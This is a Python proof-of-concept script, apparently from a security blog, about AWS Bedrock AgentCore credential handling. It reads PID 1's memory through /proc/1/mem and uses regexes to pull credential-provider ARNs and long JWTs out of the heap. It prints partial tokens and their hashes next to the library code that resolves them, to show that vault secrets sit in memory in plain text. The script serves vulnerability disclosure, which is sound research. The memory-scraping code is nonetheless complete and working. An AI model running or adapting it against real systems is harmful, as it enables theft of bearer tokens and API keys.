"""Blog demo — combined vault resolution trace: heap evidence + source code.

For each stage of the credential resolution, shows:
  1. What we found in PID 1's heap (the evidence)
  2. The source code responsible (the mechanism)

No env vars needed.
Hosted at github.com/nivmorabin/skills/dict-walk/pid1_vault_trace.py
"""
import glob
import hashlib
import re
import sys


PKG = '/opt/amazon/lib/python3.10/site-packages'


def section(title):
    print(f'\n{"=" * 60}')
    print(f'  {title}')
    print(f'{"=" * 60}')


def read_file(path):
    try:
        return open(path).read()
    except Exception as e:
        return f'(error: {e})'


def show_function(source, func_name):
    """Extract and print a function definition."""
    lines = source.split('\n')
    start = None
    for i, line in enumerate(lines):
        if f'def {func_name}' in line:
            start = i
            break
    if start is None:
        return False
    func_line = lines[start]
    func_indent = len(func_line) - len(func_line.lstrip())
    end = len(lines)
    for i in range(start + 1, len(lines)):
        line = lines[i]
        if (line.strip() and len(line) - len(line.lstrip()) <= func_indent
                and not line.strip().startswith(('#', '@', ')'))
                and i > start + 1):
            end = i
            break
    for line in lines[start:min(end, start + 30)]:
        print(f'    {line}')
    if end - start > 30:
        print(f'    ... ({end - start - 30} more lines)')
    return True


# Regexes (proven from pid1_identity_recon_exfil.py)
CRED_PROVIDER_ARN_RE = re.compile(
    rb'arn:aws:bedrock-agentcore:[a-z0-9\-]+:\d{12}:'
    rb'(?:credential-provider|token-vault/default/apikeycredentialprovider|token-vault/default/oauth2credentialprovider)'
    rb'/[A-Za-z0-9_\-]+'
)
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')


def scan_heap():
    """Scan /proc/1/mem for vault resolution artifacts."""
    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2 or 'r' not in parts[1]:
            continue
        try:
            start_s, end_s = parts[0].split('-')
            lo, hi = int(start_s, 16), int(end_s, 16)
            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except:
            continue

    cred_arns = []
    jwts = []

    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue
            for m in CRED_PROVIDER_ARN_RE.finditer(chunk):
                cred_arns.append((lo + m.start(), m.group(0)))
            for m in JWT_RE.finditer(chunk):
                tok = m.group(0)
                if len(tok) >= 600:
                    jwts.append((lo + m.start(), tok, hashlib.sha256(tok).hexdigest()))

    return cred_arns, jwts


def main():
    section('VAULT CREDENTIAL RESOLUTION: evidence + mechanism')
    print('  Each stage shows what we found in PID 1 heap, then the')
    print('  source code responsible for putting it there.')
    print()

    # Scan heap first
    print('  Scanning /proc/1/mem...')
    cred_arns, jwts = scan_heap()

    # Dedupe
    unique_arns = sorted(set(arn.decode('utf-8', errors='replace') for _, arn in cred_arns))
    seen_shas = set()
    unique_jwts = []
    for addr, tok, sha in jwts:
        if sha not in seen_shas:
            seen_shas.add(sha)
            unique_jwts.append((addr, tok, sha))
    print(f'  Done. Found: {len(cred_arns)} ARN(s), {len(unique_jwts)} unique JWT(s)')

    # Load source files
    tools_source = ''
    for fname in ('__init__.py', 'tool_provider.py'):
        content = read_file(f'{PKG}/loopy/tools/{fname}')
        if 'error' not in content[:10]:
            tools_source += content
    identity_svc = read_file(f'{PKG}/bedrock_agentcore/services/identity.py')

    # ================================================================
    # STAGE 1: Credential provider ARN found in heap
    # ================================================================
    section('STAGE 1: "arn:..." -- credential provider ARN in PID 1 heap')

    print('  --- In PID 1 heap ---')
    print(f'  Found: {len(cred_arns)} occurrence(s)')
    for arn in unique_arns:
        print(f'    {arn}')
    if cred_arns:
        print(f'  First at: {hex(cred_arns[0][0])}')
    print()
    print('  This is the credential provider ARN from our harness config.')
    print('  It was passed to resolve_credential_arn() to fetch the actual secret.')

    print()
    print('  --- The code that resolves it ---')
    print('  loopy/tools/tool_provider.py:')
    show_function(tools_source, 'resolve_header_references')
    print()
    print('  --- The call site ---')
    tp_src = read_file(f'{PKG}/loopy/tools/tool_provider.py')
    if 'error' not in tp_src[:10]:
        lines = tp_src.split('\n')
        for idx, line in enumerate(lines):
            if 'resolve_header_references' in line and 'def ' not in line:
                start = max(0, idx - 4)
                end = min(len(lines), idx + 7)
                for j in range(start, end):
                    marker = '>>>' if j == idx else '   '
                    print(f'  {marker} {j+1:4d}: {lines[j]}')
                break

    # ================================================================
    # STAGE 2: Resolved JWT (the actual credential)
    # ================================================================
    section('STAGE 2: "eyJraWQ..." -- resolved JWT credential in PID 1 heap')

    print('  --- In PID 1 heap ---')
    print(f'  Found: {len(jwts)} occurrence(s), {len(unique_jwts)} unique')
    for addr, tok, sha in unique_jwts[:3]:
        print(f'    addr: {hex(addr)}')
        print(f'    len:  {len(tok)}')
        print(f'    sha:  {sha[:32]}...')
        print(f'    head: {tok[:60].decode("ascii")}...')
        print()
    print('  This is the RESOLVED credential -- the actual JWT that was')
    print('  stored in the vault. Returned by get_resource_api_key()["apiKey"].')

    print()
    print('  --- The code that fetched it ---')
    print('  bedrock_agentcore/services/identity.py:')
    if 'error' not in identity_svc[:10]:
        show_function(identity_svc, 'get_api_key')

    # ================================================================
    # Summary
    # ================================================================
    section('THE COMPLETE PICTURE')
    print()
    print('  Config:   Authorization: Bearer ${arn:...:token-vault/.../my-mcp-cred}')
    print('       |')
    print('       |  resolve_header_references() extracts ARN, calls Identity API')
    print('       v')
    print('  ARN:      arn:aws:bedrock-agentcore:...:token-vault/.../my-mcp-cred')
    print('       |')
    print('       |  resolve_credential_arn() -> get_api_key() -> get_resource_api_key()')
    print('       v')
    print('  JWT:      eyJraWQiOi... (the actual credential, plain string)')
    print('       |')
    print('       |  stored in headers dict, sent via httpx')
    print('       v')
    print('  HEAP:     PID 1 address space, readable via /proc/1/mem')
    print()
    print('  ---------------------------------------------------------')
    print('  Both the ARN and the resolved JWT coexist in the SAME heap.')
    print()
    print('  The credential the customer NEVER held locally is sitting')
    print('  in PID 1 heap as a plain string. The vault protects at-rest')
    print('  and in-transit. It provides ZERO in-use protection.')

    section('DONE')


if __name__ == '__main__':
    main()
